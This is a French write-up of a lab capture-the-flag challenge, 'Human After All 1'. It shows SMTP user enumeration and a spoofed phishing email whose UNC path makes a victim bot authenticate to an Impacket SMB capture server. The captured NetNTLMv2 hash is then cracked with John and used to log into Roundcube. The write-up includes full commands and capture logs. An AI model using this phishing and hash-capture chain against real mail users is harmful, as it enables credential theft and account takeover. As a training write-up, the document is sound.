---
title: "Human After All · Human After All 1"
platform: "HackerLab Benin 2026 (H4ckd4ne)"
category: "misc-web"
difficulty: "—"
points: 100
os: "—"
date: 2026-11-20
author: "0xS0ra"
author_github: "H4ckd4ne"
source: "https://github.com/H4ckd4ne/hackerlab2026-writeups/blob/main/human-after-all/human-after-all-1/writeup-human-after-all-1.md"
license: "CC BY-SA 4.0"
status: published
---

# Human After All 1 — Write-up

## Objective

Mission « Human After All » (auteur `0xS0ra`, nation Tervalis), instance VPN :

- `172.28.18.2:25` — SMTP
- `172.28.18.2:143` — IMAP
- `172.28.18.4:80` — Webmail Roundcube

Questions de la mission :

1. Q1 — adresse mail locale de `mstrand` (déjà validée : `mstrand@tervalitribune.trv`).
2. Q2 — mot de passe de la messagerie de `mstrand`.
3. Q3 — numéro de téléphone de `mstrand` (question cachée).
4. Q4 — flag d'instance (`Human After All 1`, 100 pts), révélé après Q3.

État initial : Q1 validée, Q2/Q3/Q4 non résolues. L'instance est accessible via le tunnel WireGuard `172.28.18.0/24`.

## Reconnaissance

### SMTP

`VRFY`/`EXPN` sont désactivés. L'énumération des destinataires via `RCPT TO` (après un `MAIL FROM` local) révèle deux boîtes valides :

```text
RCPT TO:<mstrand@tervalitribune.trv> -> 250 2.1.5 Ok
RCPT TO:<admin@tervalitribune.trv>   -> 250 2.1.5 Ok
RCPT TO:<redaction@tervalitribune.trv> -> 550 5.1.1 User unknown in virtual mailbox table
```

Le serveur utilise une table de boîtes virtuelles ; le domaine local est `tervalitribune.trv` (bannière `mail.tervalitribune.trv`).

### Webmail / IMAP

- Roundcube `1.6.16` sur Apache/PHP.
- Dovecot expose `AUTH=PLAIN` et `AUTH=LOGIN`.
- Les tentatives d'authentification en ligne sont fortement ralenties (délai de plusieurs secondes, connexion coupée après quelques échecs). Le bruteforce en ligne du webmail/IMAP a été abandonné.
- Le carnet d'adresses Roundcube de `mstrand` est vide.
- Les plugins/config Roundcube ne sont pas exposés (`/config/`, `/plugins/`, `/installer/` bloqués ou absents).

## Q2 — capture du hash NTLMv2 par phishing

L'indice officiel de Q2 est explicite :

> Obtenez le hash NTLMv2 du mot de passe de mstrand en le piégeant au moyen d'une attaque de phishing.

### Serveur SMB de capture

Un serveur SMB Impacket sans identifiants est lancé sur le port 445 (root requis). Il accepte la négociation SMB2 et journalise le message `AUTHENTICATE_MESSAGE` ainsi que le hash NetNTLMv2 :

```bash
sudo python3 /tmp/smb_capture.py share /tmp/smbshare 445 /tmp/ntlm_hashes.txt
```

Le script utilise `impacket.smbserver.SimpleSMBServer`, `setSMB2Support(True)`, et laisse l'authentification anonyme réussir pour déclencher l'écriture du hash dans le journal.

### Mail piégé

Un mail est envoyé à `mstrand@tervalitribune.trv` avec un chemin UNC vers le serveur de capture :

```text
From: "Direction Tervali Tribune" <direction@tervalitribune.trv>
To: mstrand@tervalitribune.trv
Subject: Rapport confidentiel - partage interne

Mikkel,
Le rapport est sur le partage interne :
\\10.133.100.85\share\rapport.txt
```

Le bot victime (`172.28.18.3`) traite le lien UNC et s'authentifie en SMB :

```text
[2026-11-16 15:30:59] [*] Incoming connection (172.28.18.3,39080)
[2026-11-16 15:30:59] [*] AUTHENTICATE_MESSAGE (TERVALIS\mstrand,)
[2026-11-16 15:30:59] [*] mstrand::TERVALIS:aaaaaaaaaaaaaaaa:<NTProof>:<blob>
```

Le hash NetNTLMv2 capturé est au format hashcat/John (`mstrand::TERVALIS:...`). Le domaine est `TERVALIS`, l'utilisateur `mstrand`.

### Cracking hors-ligne

Le hash est cassé hors-ligne avec John (format `netntlmv2`) et `rockyou.txt` :

```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt \
     --pot=/tmp/john_mstrand.pot /tmp/mstrand_ntlm.txt
```

Le mot de passe est retrouvé immédiatement. Il est soumis à Q2 sous la forme `[redacted flag]` ; la plateforme répond `Correct`.

> Le mot de passe Q2 est volontairement omis de ce write-up (réponse soumise).

## Q3 / Q4 — identités Roundcube

Le mot de passe Q2 permet de se connecter à Roundcube (`mstrand@tervalitribune.trv`) et en IMAP. La boîte contient 112 messages ; la recherche de numéros de téléphone ne donne que des lignes fixes de tiers (mairie, agence de communication), pas le numéro de `mstrand`.

Le carnet d'adresses est vide, mais la page **Paramètres → Identités** de Roundcube révèle trois identités :

```text
M. Strand <mstrand@tervalitribune.trv>
M. Strand (perso) <mstrand67894@proton.me>
[redacted flag] <[redacted flag]@tervalitribune.trv>
```

La troisième identité contient directement le **flag d'instance** (Q4). L'indice « c'est un truc en rapport avec les identités Roundcube » confirme la piste.

La page est accessible avec la session Roundcube :

```bash
curl -s -b cookies.txt 'http://172.28.18.4/?_task=settings&_action=identities'
```

Le flag est soumis à la carte `Human After All 1` (challenge id 279) via l'API la plateforme :

```text
POST /api/v1/challenges/attempt
{"challenge_id":279,"submission":"[redacted flag]
```

Réponse : `{"success":true,"data":{"status":"correct","message":"Correct"}}`.

> Le flag d'instance est volontairement omis de ce write-up (réponse soumise).

## Pistes qui ont échoué

- **Bruteforce IMAP/Webmail** : délais d'authentification et coupures ; aucune tentative massive poursuivie.
- **Réponse du bot par email** : le bot traite les liens UNC (authentification SMB) mais ne répond pas aux demandes de numéro, ni aux mails internes/externes testés (admin, direction, source Proton, adresses `+q3`).
- **Catcher SMTP** : les réponses externes sont bloquées par la politique de relais/DMARC du serveur ; le bot n'a pas répondu.
- **Compte Proton** `mstrand67894@proton.me` : le compte existe, mais le mot de passe Q2 n'est pas son mot de passe. Aucune tentative de bruteforce Proton (service tiers hors périmètre).
- **XSS dans les mails** : tests `<script>`/`<img onerror>` sans callback HTTP ; Roundcube ne les exécute pas.
- **Téléphone dans les mails** : seuls des numéros de tiers sont présents ; le carnet d'adresses Roundcube est vide.

## Validation reproductible

1. Lancer le serveur SMB de capture sur le port 445 (root) :
   ```bash
   sudo python3 /tmp/smb_capture.py share /tmp/smbshare 445 /tmp/ntlm_hashes.txt
   ```
2. Envoyer un mail à `mstrand@tervalitribune.trv` contenant `\\10.133.100.85\share\rapport.txt`.
3. Vérifier dans `/tmp/smbcapture445.log` la ligne `AUTHENTICATE_MESSAGE (TERVALIS\mstrand,)` et le hash `mstrand::TERVALIS:...`.
4. Casser le hash :
   ```bash
   john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/mstrand_ntlm.txt
   ```
5. Se connecter à Roundcube avec `mstrand@tervalitribune.trv` et le mot de passe obtenu.
6. Ouvrir `/?_task=settings&_action=identities` : la troisième identité contient le flag d'instance.
7. Soumettre ce flag à `Human After All 1` (challenge 279) : la plateforme répond `Correct`.

## Nettoyage

- Arrêter le serveur SMB de capture et le serveur HTTP de test lancés pendant la résolution.
- Aucun identifiant supplémentaire n'a été créé sur l'instance.
- Le mot de passe Q2 et le flag d'instance ne sont pas écrits dans ce document.
